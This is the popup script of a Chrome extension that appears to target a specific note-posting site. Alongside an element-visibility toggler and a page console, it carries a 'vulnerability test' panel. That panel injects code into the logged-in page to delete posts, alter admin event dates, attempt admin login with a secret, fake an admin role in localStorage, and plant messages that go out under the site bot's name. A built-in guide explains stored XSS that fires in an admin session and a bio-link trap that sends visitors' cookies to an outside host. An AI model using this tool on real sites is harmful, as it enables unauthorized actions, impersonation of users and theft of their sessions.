document.addEventListener("DOMContentLoaded", async () => {
  if (!chrome.runtime?.id) {
    document.body.innerHTML = '<p style="color:red;">拡張機能のコンテキストが無効です。再読み込みしてください。</p>';
    return;
  }

  // ---- タブ切り替え ----
  const tabButtons = document.querySelectorAll('.tab-btn');
  const panels = {
    elements: document.getElementById('panel-elements'),
    tests: document.getElementById('panel-tests'),
    console: document.getElementById('panel-console')
  };

  tabButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      tabButtons.forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      Object.keys(panels).forEach(key => {
        panels[key].classList.toggle('active', key === btn.dataset.tab);
      });
    });
  });

  // ---- 管理者切り替え ----
  document.getElementById("btn-admin").onclick = () => {
    executeScriptInPage("_openAdminSwitchModal('admin')").catch(() => {});
  };

  // ---- 再スキャン ----
  document.getElementById("btn-rescan").onclick = () => {
    chrome.storage.local.remove(["cached_elements"], () => {
      if (chrome.runtime.lastError) return;
      renderPopupUI();
    });
  };

  // ---- 初期化 ----
  document.getElementById("btn-reset").onclick = () => {
    if (confirm("保存された全設定とキャッシュを消去して初期化しますか？")) {
      chrome.storage.local.clear(() => {
        if (chrome.runtime.lastError) return;
        document.getElementById("search-input").value = "";
        chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
          if (chrome.runtime.lastError || !tabs[0]) return;
          chrome.tabs.reload(tabs[0].id);
        });
        renderPopupUI();
      });
    }
  };

  // ---- 要素検索 ----
  document.getElementById("search-input").addEventListener("input", (e) => {
    filterElements(e.target.value.toLowerCase());
  });

  // ---- 脆弱性テストボタン ----
  document.getElementById("btn-test-bot-comment").onclick = () => {
    const postId = document.getElementById("vuln-post-id").value.trim();
    if (!postId) return alert("記事IDを入力してください");
    const code = `
      (async function() {
        try {
          const res = await fetch('/api/posts/${postId}/bot-comment', {
            method: 'POST',
            credentials: 'include',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: 'Test from extension', lock: true })
          });
          const data = await res.json();
          console.log('Bot comment response:', data);
          alert('Botコメント送信完了 (レスポンスはコンソールを確認)');
        } catch(e) {
          alert('エラー: ' + e.message);
          console.error(e);
        }
      })();
    `;
    executeScriptInPage(code).catch(() => {});
  };

  document.getElementById("btn-test-delete-post").onclick = () => {
    const postId = document.getElementById("vuln-post-id").value.trim();
    if (!postId) return alert("記事IDを入力してください");
    if (!confirm(`記事 ${postId} を本当に削除しますか？`)) return;
    const code = `
      (async function() {
        try {
          const res = await fetch('/api/posts/${postId}', {
            method: 'DELETE',
            credentials: 'include',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ reason: 'spam' })
          });
          const data = await res.json();
          console.log('Delete response:', data);
          alert('記事削除リクエスト送信完了 (レスポンスはコンソールを確認)');
        } catch(e) {
          alert('エラー: ' + e.message);
          console.error(e);
        }
      })();
    `;
    executeScriptInPage(code).catch(() => {});
  };

  document.getElementById("btn-test-event-patch").onclick = () => {
    const start = prompt("開始日時 (ISO8601, 例: 2020-01-01T00:00:00Z)", "2020-01-01T00:00:00Z");
    if (start === null) return;
    const end = prompt("終了日時 (ISO8601, 例: 2020-01-02T00:00:00Z)", "2020-01-02T00:00:00Z");
    if (end === null) return;
    const code = `
      (async function() {
        try {
          const res = await fetch('/api/admin/event', {
            method: 'PATCH',
            credentials: 'include',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ start: '${start}', end: '${end}' })
          });
          const data = await res.json();
          console.log('Event patch response:', data);
          alert('イベント期間改ざんリクエスト送信完了 (レスポンスはコンソールを確認)');
        } catch(e) {
          alert('エラー: ' + e.message);
          console.error(e);
        }
      })();
    `;
    executeScriptInPage(code).catch(() => {});
  };

  document.getElementById("btn-test-csrf").onclick = () => {
    const postId = document.getElementById("vuln-post-id").value.trim();
    if (!postId) return alert("記事IDを入力してください");
    if (!confirm(`CSRFテスト: 記事 ${postId} を削除するリクエストを送信します。\n（実際に削除される可能性があります）`)) return;
    const code = `
      (async function() {
        try {
          const res = await fetch('/api/posts/${postId}', {
            method: 'DELETE',
            credentials: 'include',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ reason: 'csrf_test' })
          });
          const data = await res.json();
          console.log('CSRF test response:', data);
          alert('CSRFリクエスト送信完了 (レスポンスはコンソールを確認)');
        } catch(e) {
          alert('エラー: ' + e.message);
          console.error(e);
        }
      })();
    `;
    executeScriptInPage(code).catch(() => {});
  };

  document.getElementById("btn-test-sessionstorage").onclick = () => {
    const postId = document.getElementById("vuln-post-id").value.trim();
    if (!postId) return alert("記事IDを入力してください");
    const msg = prompt("設定する返信文を入力", "規約違反のためアカウントを停止します。");
    if (msg === null) return;
    const code = `
      (function() {
        const key = '_sn_bot_reply_${postId}';
        sessionStorage.setItem(key, '${msg.replace(/'/g, "\\'")}');
        console.log('sessionStorage に設定: ' + key + ' = ' + sessionStorage.getItem(key));
        alert('sessionStorage に返信文を設定しました。\\n対象の投稿者が確認ページを開くと、この文章がSukuNoteBot名義で送信されます。');
      })();
    `;
    executeScriptInPage(code).catch(() => {});
  };

  document.getElementById("btn-test-fake-admin").onclick = () => {
    const code = `
      (function() {
        try {
          const user = JSON.parse(localStorage.getItem('sn_user') || '{}');
          user.role = 'admin';
          localStorage.setItem('sn_user', JSON.stringify(user));
          alert('ローカルストレージの role を "admin" に変更しました。\\nページを再読み込みすると管理者用UIボタンが表示されます。');
          location.reload();
        } catch(e) {
          alert('エラー: ' + e.message);
        }
      })();
    `;
    executeScriptInPage(code).catch(() => {});
  };

  document.getElementById("btn-test-admin-login").onclick = () => {
    const secret = document.getElementById("vuln-secret").value.trim();
    if (!secret) return alert("シークレットを入力してください");
    const username = prompt("ユーザー名 (デフォルト: admin)", "admin") || "admin";
    const code = `
      (async function() {
        try {
          const res = await fetch('/api/auth/admin-login', {
            method: 'POST',
            credentials: 'include',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: '${username}', secret: '${secret.replace(/'/g, "\\'")}' })
          });
          const data = await res.json();
          console.log('Admin login response:', data);
          alert('ログイン試行結果:\\n' + JSON.stringify(data, null, 2));
        } catch(e) {
          alert('エラー: ' + e.message);
          console.error(e);
        }
      })();
    `;
    executeScriptInPage(code).catch(() => {});
  };

  // ---- XSSペイロードコピー ----
  document.querySelectorAll('[data-payload]').forEach(btn => {
    btn.addEventListener('click', async () => {
      const payload = btn.dataset.payload;
      try {
        await navigator.clipboard.writeText(payload);
        const orig = btn.textContent;
        btn.textContent = '✅ コピー完了';
        setTimeout(() => btn.textContent = orig, 1500);
      } catch (_) {
        alert('コピーに失敗しました。手動で選択してコピーしてください。');
      }
    });
  });

  // ---- カバー画像テスト ----
  document.getElementById('btn-test-cover').addEventListener('click', () => {
    const url = document.getElementById('vuln-cover-url').value.trim();
    if (!url) return alert('URLを入力してください');
    if (!confirm(`カバー画像を ${url} に設定しますか？（実際に設定されます）`)) return;
    const code = `
      (async function() {
        try {
          const res = await fetch('/api/users/me', { credentials: 'include' });
          const user = await res.json();
          const username = user.username;
          const payload = { coverKey: '${url}' };
          const updateRes = await fetch('/api/users/' + username, {
            method: 'PATCH',
            credentials: 'include',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
          const result = await updateRes.json();
          console.log('Cover update response:', result);
          alert('カバー画像更新リクエスト送信完了。レスポンスはコンソールで確認してください。');
        } catch(e) {
          alert('エラー: ' + e.message);
          console.error(e);
        }
      })();
    `;
    executeScriptInPage(code).catch(() => {});
  });

  // ---- ガイド表示 ----
  document.getElementById('btn-show-payload-guide').addEventListener('click', () => {
    alert(
      '【XSSテスト手順】\n' +
      '1. 記事作成/編集画面で「タイトルXSS」ペイロードをタイトルに貼り付け、保存。\n' +
      '2. 管理者権限のユーザーでその記事の著者のプロフィールを開く。\n' +
      '   → XSS発火（管理者セッションでAPI実行）\n\n' +
      '【Bioリンク罠】\n' +
      '自己紹介欄に「Bioリンク罠」ペイロードを貼り付け保存。\n' +
      '→ リンクをクリックしたユーザーのCookieが外部に送信。\n\n' +
      '【カバー画像テスト】\n' +
      '任意の外部画像URLを設定できるか確認。\n' +
      '（Cloudinary以外のドメインが許可されている場合）'
    );
  });

  // ---- コンソール機能（ページの実際のコンソール出力をキャプチャ） ----
  const consoleInput = document.getElementById('console-input');
  const consoleOutput = document.getElementById('console-output');
  let consolePort = null;

  function appendConsole(level, args, timestamp) {
    const line = document.createElement('div');
    const time = timestamp ? new Date(timestamp).toLocaleTimeString() : '';
    const prefix = time ? `[${time}] ` : '';
    const levelMap = {
      log: 'result',
      error: 'error',
      warn: 'warning',
      info: 'info',
      debug: 'debug'
    };
    line.className = 'console-line ' + (levelMap[level] || 'result') + '-line';
    // args は配列で渡ってくる
    let text = prefix;
    if (Array.isArray(args)) {
      text += args.join(' ');
    } else {
      text += String(args);
    }
    line.textContent = text;
    consoleOutput.appendChild(line);
    consoleOutput.scrollTop = consoleOutput.scrollHeight;
  }

  // コンソールポートを開く（アクティブタブのcontent scriptと接続）
  function openConsolePort() {
    if (consolePort) {
      try { consolePort.disconnect(); } catch (_) {}
      consolePort = null;
    }

    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
      if (chrome.runtime.lastError || !tabs[0]) return;
      try {
        consolePort = chrome.tabs.connect(tabs[0].id, { name: 'console' });
        consolePort.onMessage.addListener((msg) => {
          if (msg.type === 'initial') {
            // 初期ログを表示
            msg.logs.forEach(log => {
              appendConsole(log.level, log.args, log.timestamp);
            });
          } else if (msg.type === 'log') {
            // リアルタイムログ
            appendConsole(msg.entry.level, msg.entry.args, msg.entry.timestamp);
          }
        });
        consolePort.onDisconnect.addListener(() => {
          consolePort = null;
        });
      } catch (_) {
        consolePort = null;
      }
    });
  }

  // ポップアップ表示時にコンソールポートを開く
  openConsolePort();

  // タブが切り替わったら再接続（ポップアップは開きっぱなしの場合）
  chrome.tabs.onActivated.addListener(() => {
    if (document.getElementById('panel-console').classList.contains('active')) {
      openConsolePort();
    }
  });

  // コンソールクリア
  document.getElementById('console-clear').addEventListener('click', () => {
    consoleOutput.innerHTML = '';
    // content script のログもクリアするためメッセージ送信
    if (consolePort) {
      try {
        consolePort.postMessage({ type: 'clear' });
      } catch (_) {}
    }
  });

  // コンソール実行（既存の executeScriptInPage を使う）
  document.getElementById('console-run').addEventListener('click', async () => {
    const code = consoleInput.value.trim();
    if (!code) return;
    appendConsole('log', ['> ' + code], Date.now());
    consoleInput.value = '';

    try {
      const result = await executeScriptInPage(code);
      if (result && typeof result === 'object' && result.__error__) {
        appendConsole('error', ['Error: ' + result.__error__], Date.now());
        if (result.__stack__) appendConsole('error', [result.__stack__], Date.now());
      } else {
        const formatted = typeof result === 'string' ? result : JSON.stringify(result, null, 2);
        appendConsole('log', [formatted], Date.now());
      }
    } catch (err) {
      appendConsole('error', ['Error: ' + err.message], Date.now());
    }
  });

  // Enterキーで実行
  consoleInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') document.getElementById('console-run').click();
  });

  // ---- UI描画 ----
  renderPopupUI();
});

// ========== 共通関数 ==========

// ページコンテキストでコードを実行し、結果をPromiseで返す
function executeScriptInPage(codeString) {
  return new Promise((resolve, reject) => {
    if (!chrome.runtime?.id) {
      reject(new Error("拡張機能のコンテキストが無効です"));
      return;
    }
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
      if (chrome.runtime.lastError || !tabs[0]) {
        reject(new Error("アクティブなタブが見つかりません"));
        return;
      }
      chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        world: 'MAIN',
        func: async (code) => {
          try {
            let result = eval(code);
            if (result instanceof Promise) result = await result;
            return result;
          } catch (e) {
            return { __error__: e.message, __stack__: e.stack };
          }
        },
        args: [codeString]
      }, (results) => {
        if (chrome.runtime.lastError) {
          reject(new Error(chrome.runtime.lastError.message));
          return;
        }
        if (results && results[0] && results[0].result !== undefined) {
          resolve(results[0].result);
        } else {
          resolve(undefined);
        }
      });
    });
  });
}

// 要素パネル描画
async function renderPopupUI() {
  try {
    if (!chrome.runtime?.id) {
      document.getElementById("toggle-container").innerHTML =
        '<p style="font-size:12px; color:#dc2626;">拡張機能のコンテキストが無効です。</p>';
      return;
    }

    const container = document.getElementById("toggle-container");
    const storageData = await chrome.storage.local.get(["cached_elements", "user_states"]);
    let elements = storageData.cached_elements || [];
    const userStates = storageData.user_states || {};

    if (elements.length === 0) {
      container.innerHTML = "<p style='font-size:12px; color:#64748b;'>スキャン中...</p>";
      elements = await getFastElementsFromTab();
    }

    if (!elements || elements.length === 0) {
      container.innerHTML = "<p style='font-size:12px; color:#64748b;'>要素が見つかりませんでした。</p>";
      return;
    }

    container.innerHTML = "";
    elements.forEach((item, index) => {
      const rawName = item.id ? item.id : item.className.split(' ')[0];
      const key = item.id || item.className;
      const isChecked = userStates[key] !== undefined ? userStates[key] : item.defaultVisible;

      const row = document.createElement("div");
      row.className = "item";
      row.setAttribute("data-search", `${rawName} ${item.translatedName || ''}`.toLowerCase());

      row.innerHTML = `
        <div>
          <div class="item-label" id="label-${index}">${item.translatedName || rawName}</div>
          <div style="font-size: 10px; color: #94a3b8;">#${rawName} (${item.tagName})</div>
        </div>
        <label class="switch">
          <input type="checkbox" id="toggle-${index}" ${isChecked ? 'checked' : ''}>
          <span class="slider"></span>
        </label>
      `;

      container.appendChild(row);

      document.getElementById(`toggle-${index}`).onchange = (e) => {
        const show = e.target.checked;
        userStates[key] = show;
        chrome.storage.local.set({ user_states: userStates }, () => {
          if (chrome.runtime.lastError) return;
        });
        toggleElementVisibility(item.id, item.className, show);
      };
    });

    translateAndSaveInBackground(elements, userStates);
  } catch (error) {
    console.warn("renderPopupUI エラー:", error);
    if (!chrome.runtime?.id) {
      document.getElementById("toggle-container").innerHTML =
        '<p style="font-size:12px; color:#dc2626;">拡張機能が再読み込みされました。ポップアップを閉じて再度開いてください。</p>';
    }
  }
}

function filterElements(query) {
  const items = document.querySelectorAll("#toggle-container .item");
  items.forEach(item => {
    const searchText = item.getAttribute("data-search") || "";
    item.style.display = searchText.includes(query) ? "flex" : "none";
  });
}

function getFastElementsFromTab() {
  return new Promise((resolve) => {
    if (!chrome.runtime?.id) { resolve([]); return; }
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
      if (chrome.runtime.lastError || !tabs[0]) { resolve([]); return; }
      chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: () => {
          const targets = document.querySelectorAll('[id], [class*="modal"], [class*="toast"], [class*="hidden"]');
          const list = [];
          targets.forEach(el => {
            if (['SCRIPT', 'STYLE', 'HTML', 'BODY'].includes(el.tagName)) return;
            const rawName = el.id ? el.id : el.className.split(' ')[0];
            if (!rawName) return;
            list.push({
              id: el.id || '',
              className: el.className || '',
              tagName: el.tagName.toLowerCase(),
              defaultVisible: !el.classList.contains('hidden') && window.getComputedStyle(el).display !== 'none'
            });
          });
          return Array.from(new Set(list.map(a => JSON.stringify(a)))).map(a => JSON.parse(a));
        }
      }, (results) => {
        if (chrome.runtime.lastError || !results || !results[0]) { resolve([]); return; }
        resolve(results[0].result || []);
      });
    });
  });
}

async function translateAndSaveInBackground(elements, userStates) {
  try {
    if (!chrome.runtime?.id) return;
    let hasNewTranslation = false;
    for (let index = 0; index < elements.length; index++) {
      const item = elements[index];
      if (!item.translatedName) {
        const rawName = item.id ? item.id : item.className.split(' ')[0];
        const translated = await translateText(rawName);
        item.translatedName = translated;
        hasNewTranslation = true;
        const labelEl = document.getElementById(`label-${index}`);
        if (labelEl) {
          labelEl.textContent = translated;
          const parentRow = labelEl.closest('.item');
          if (parentRow) parentRow.setAttribute("data-search", `${rawName} ${translated}`.toLowerCase());
        }
      }
    }
    if (hasNewTranslation) {
      chrome.storage.local.set({ cached_elements: elements }, () => {
        if (chrome.runtime.lastError) return;
      });
    }
  } catch (_) {}
}

async function translateText(text) {
  if (!text) return "名称不明の要素";
  const cleanText = text.replace(/[-_]/g, ' ').replace(/([a-z])([A-Z])/g, '$1 $2');
  try {
    const url = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=ja&dt=t&q=${encodeURIComponent(cleanText)}`;
    const res = await fetch(url);
    const data = await res.json();
    return data[0][0][0];
  } catch (e) {
    return cleanText;
  }
}

function toggleElementVisibility(id, className, show) {
  if (!chrome.runtime?.id) return;
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    if (chrome.runtime.lastError || !tabs[0]) return;
    chrome.scripting.executeScript({
      target: { tabId: tabs[0].id },
      func: (targetId, targetClass, isVisible) => {
        let el = targetId ? document.getElementById(targetId) : document.querySelector('.' + targetClass.split(' ')[0]);
        if (el) {
          el.classList.toggle('hidden', !isVisible);
          el.style.display = isVisible ? 'flex' : 'none';
        }
      },
      args: [id, className, show]
    });
  });
}